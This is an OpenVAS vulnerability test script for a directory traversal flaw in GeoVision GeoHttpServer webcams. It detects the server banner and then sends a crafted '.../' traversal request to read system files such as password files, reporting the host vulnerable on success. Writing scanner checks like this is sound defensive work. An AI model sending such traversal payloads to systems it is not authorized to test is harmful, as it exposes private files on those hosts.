###############################################################################
# OpenVAS Vulnerability Test
#
# GeoVision GeoHttpServer WebCams Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805072");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2015-06-25 15:49:40 +0530 (Thu, 25 Jun 2015)");
  script_name("GeoVision GeoHttpServer WebCams Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 81);
  script_mandatory_keys("GeoHttpServer/banner");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37258");

  script_tag(name:"summary", value:"This host is running GeoVision GeoHttpServer
  WebCams and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not.");

  script_tag(name:"insight", value:"The flaw allows unauthenticated attackers to
  download arbitrary files through path traversal.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"GeoVision GeoHttpServer 8.3.3.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

GeoHttpPort = http_get_port(default:81);

banner = http_get_remote_headers(port:GeoHttpPort);
if("Server: GeoHttpServer" >!< banner) {
  exit(0);
}

files = traversal_files();
foreach file (keys(files)){

  url = "/" + crap(data:".../", length:3*5) + "/" + files[file];

  if(http_vuln_check(port:GeoHttpPort, url:url, pattern:file)){
    report = http_report_vuln_url(port:GeoHttpPort, url:url);
    security_message(port:GeoHttpPort, data:report);
    exit(0);
  }
}

exit(99);
